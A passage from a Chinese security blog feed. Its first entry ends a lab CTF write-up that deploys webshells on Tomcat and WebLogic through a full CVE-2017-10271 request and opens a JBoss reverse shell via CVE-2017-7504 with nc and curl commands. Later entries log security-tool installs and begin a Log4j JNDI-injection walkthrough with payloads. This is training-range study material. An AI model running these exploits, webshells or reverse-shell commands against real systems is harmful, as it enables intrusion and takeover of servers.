alt="image-20220102151427997"></p><p>本机为172.16.20.66</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p><h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p><p>发现其他5台存活主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure><h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p><p>1，我的frpc竟然不能运行，重新下载了</p><p>2，这个报错是frpc.ini里面的注释没有删除</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p><p>终于代理好了，</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p><p>下面就一个一个网站看吧</p><h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p><p><a href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p><p>tomcat tomcat登陆，进入后台</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p><p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102172206117.png" alt="image-20220102172206117"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p><p><a href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p><p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p><p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p><h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure><p>能访问<a href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p><p>我说咋不能利用exp，原来，burp没有挂代理。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span>.<span class="number">20.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p><p><a href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003242901.png" alt="image-20220103003242901"></p><p>哥斯拉链接</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p><p>root用户，无其他网段</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p><p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p><h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p><p>确定为Shiro</p><p>用工具<a href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p><h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p><ul><li><p><a href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p><p>  admin  admin 进入</p></li></ul><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p><p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p><p>root权限</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p><p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p><hr><p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p><p>感悟：第一是工具，第二是漏洞不是很敏感</p>]]></content>
    
    
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;提示：一共12个flag，有内网。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;标准：5个合格&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;靶场地址：http:&amp;#x2F;&amp;#x2F;1.14.65.168:8077&amp;#x2F;m&amp;#x2F;index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;刚过完年，来玩一玩&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="漏洞利用" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>工具安装记录</title>
    <link href="http://example.com/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</id>
    <published>2021-12-29T07:39:20.000Z</published>
    <updated>2022-05-24T15:43:51.576Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><a id="more"></a><h3 id="资产灯塔系统ARL安装使用"><a href="#资产灯塔系统ARL安装使用" class="headerlink" title="资产灯塔系统ARL安装使用"></a><a href="https://www.cnblogs.com/qtzd/p/install-ARL.html">资产灯塔系统ARL安装使用</a></h3><p>官方连接<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>安装过程<a href="https://www.cnblogs.com/qtzd/p/14678853.html">https://www.cnblogs.com/qtzd/p/14678853.html</a></p><p>使用教程<a href="https://www.bilibili.com/video/BV1ba41167FR?p=23">https://www.bilibili.com/video/BV1ba41167FR?p=23</a></p><blockquote><p>使用流程</p></blockquote><ol><li>添加资产分组</li><li>添加策略（有很多功能）</li><li>添加监控任务（这时候可以选择策略）</li></ol><blockquote><p>升级</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl</span><br><span class="line"></span><br><span class="line">git pull </span><br><span class="line"></span><br><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl&#x2F;docker</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><blockquote><p>忘记密码</p></blockquote><p>进入数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it arl_mongodb mongo -u admin -p admin</span><br></pre></td></tr></table></figure><p>下面执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; use arl</span><br><span class="line">switched to db arl</span><br><span class="line">&gt; db.user.drop()</span><br><span class="line">true</span><br><span class="line">&gt; db.user.insert(&#123;username: &#39;admin&#39;, password: hex_md5(&#39;arlsalt!@#&#39;+&#39;admin123&#39;)&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; exit</span><br><span class="line">bye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用admin&#x2F;admin123登陆</span><br></pre></td></tr></table></figure><h3 id="freenom-cloudflare"><a href="#freenom-cloudflare" class="headerlink" title="freenom+cloudflare"></a>freenom+cloudflare</h3><p>freenom:<a href="https://www.freenom.com/zh/index.html?lang=zh">https://www.freenom.com/zh/index.html?lang=zh</a></p><p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170459840.png" alt="image-20220127170459840"></p><p>cloudflare:<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170605260.png" alt="image-20220127170605260"></p><p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170626202.png" alt="image-20220127170626202"></p><p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127171635729.png" alt="image-20220127171635729"></p><h3 id="Impacket"><a href="#Impacket" class="headerlink" title="[Impacket ]"></a>[Impacket ]</h3><p>介绍：<a href="https://www.cnblogs.com/backlion/p/10676339.html">https://www.cnblogs.com/backlion/p/10676339.html</a></p><p>安装方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;examples</span><br><span class="line">工具都在这个目录里impacket&#x2F;examples</span><br></pre></td></tr></table></figure><p>打内网里面很多py还是很方便的</p><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><ul><li>存在验证码环境下爆破</li></ul><p><a href="https://github.com/c0ny1/captcha-killer">c0ny1/验证码杀手： 打嗝验证码识别接口调用插件 (github.com)</a></p><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">smxiazi/NEW_xp_CAPTCHA： xp_CAPTCHA（瞎跑 白嫖版） burp 验证码 识别 burp插件 (github.com)</a></p><p>两者配合</p><p>参考：<a href="https://mp.weixin.qq.com/s/ueD26pTySfaCYN3WJCmhNw">https://mp.weixin.qq.com/s/ueD26pTySfaCYN3WJCmhNw</a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h3 id="vscodo-go-debug环境-失败"><a href="#vscodo-go-debug环境-失败" class="headerlink" title="vscodo go debug环境 失败"></a>vscodo go debug环境 失败</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE&#x3D;auto</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43573718/article/details/119488777">(26条消息) VSCode安装go插件失败_编程猿哥的博客-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="工具安装记录" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>log4j2远程代码执行漏洞</title>
    <link href="http://example.com/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-12T16:03:48.000Z</published>
    <updated>2022-04-23T04:35:05.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p><p>log4j2中存在<code>JNDI注入漏洞</code>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上<code>执行任意代码</code>。</p><a id="more"></a><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者可以通过 log4j 的 lookup 替换功能向其配置文件的任意位置注入代码（类似 SQL 注入，把 变量替换为{实际代码}），再加上这些版本中用到的 JNDI 特性并没有为 LDAP 提供足够的保护，使得注入的任意代码都能被执行。</p><p>先说下利用exp：${jndi:rmi://127.0.0.1:1099/exp}   (rmi/ldap ，两者部分功能类似，但也有不同点)      再直白点来说就是 用户提交的${jndi:rmi://127.0.0.1:1099/exp} ，被日志捕获到，然后如果log4j2 又开启了 Jndi Lookup功能，就能解析用户提交的exp，发送rmi请求，远程调用一些反序类化的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JNDI：Java 命名与目录接口，提供了用名称来访问资源的能力</span><br><span class="line">LDAP：轻型目录访问协议，定义了如何访问目录服务中的内容</span><br><span class="line"></span><br><span class="line">两者配合，可以完成对服务器目录的操作，比如增删改查。</span><br></pre></td></tr></table></figure><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Apache Log4j 2.x &lt; 2.15.0-rc2</li><li><strong>供应链影响范围</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">等</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞环境：vulfocus(<a href="http://vulfocus.fofa.so/#/dashboard">http://vulfocus.fofa.so/#/dashboard</a></p><p>vulfocus.fofa.so:44873</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002417059.png" alt="image-20211213002417059"></p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><code>漏洞验证</code></h4><p>打开<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a>  get subdomain</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002813058.png" alt="image-20211213002813058"></p><p>输入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;ip&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">payload  这个参数名字不能错</span><br><span class="line">ip暂时换上对应域名</span><br></pre></td></tr></table></figure><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002723533.png" alt="image-20211213002723533"></p><p>返回dnslog，refresh一下，可以看到记录，说明，请求了该域名，证明漏洞可能存在（极大几率）</p><p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213003146701.png" alt="image-20211213003146701"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><code>反弹shell</code></h4><p>需要<a 